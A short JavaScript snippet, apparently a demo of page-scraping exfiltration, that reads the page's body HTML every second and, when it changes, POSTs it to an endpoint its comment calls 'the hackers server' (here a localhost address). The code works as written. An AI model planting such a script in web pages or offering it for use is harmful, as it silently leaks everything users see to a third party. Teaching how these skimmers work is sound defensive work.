// Every second check if the DOM has changed
// (what the user sees on the screen)
// and grab the current content
let bodyContent = '';
setInterval(async () => {
  // read the content in the body tag
  let newBodyContent = document.body.innerHTML;
  // check if changed
  if (bodyContent !== newBodyContent) {
    bodyContent = newBodyContent;
    // Send the body content to the hackers server
    await fetch(
      'http://localhost:5005/api/log',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ domHtml: bodyContent })
      }
    );
  }
}, 1000);